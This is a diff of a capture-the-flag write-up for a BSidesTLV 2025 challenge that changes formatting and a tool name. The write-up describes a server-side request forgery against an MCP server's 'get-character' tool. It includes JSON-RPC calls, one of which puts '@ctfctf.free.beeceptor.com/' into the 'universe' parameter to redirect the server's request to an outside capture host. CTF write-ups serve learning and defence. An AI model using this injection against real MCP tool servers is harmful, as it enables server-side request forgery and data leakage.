@@ -1,10 +1,10 @@
-# BSidesTLV 2025 — ComicsMCP: SSRF via MCP Universe Parameter
+# BSidesTLV 2025 - ComicsMCP: SSRF via MCP Universe Parameter
 
 The challenge exposes an MCP server. After navigating to the URL, the first step is to establish a session by sending the MCP initialization request, which returns an `mcp-session-id` header to use in subsequent calls.
 
 ## Enumerating Tools
 
-A `tools/list` call reveals a `get_character` tool that accepts two parameters: `universe` and `name`. A normal call looks like:
+A `tools/list` call reveals a `get-character` tool that accepts two parameters: `universe` and `name`. A normal call looks like:
 
 ```json
 {
@@ -12,7 +12,7 @@ A `tools/list` call reveals a `get_character` tool that accepts two parameters: 
   "id": 1,
   "method": "tools/call",
   "params": {
-    "name": "get_character",
+    "name": "get-character",
     "arguments": {
       "universe": "marvel",
       "name": "hulk"
@@ -41,7 +41,7 @@ By using the `@` character in the `universe` parameter, we make the server treat
   "id": 1,
   "method": "tools/call",
   "params": {
-    "name": "get_character",
+    "name": "get-character",
     "arguments": {
       "universe": "@ctfctf.free.beeceptor.com/",
       "name": ""
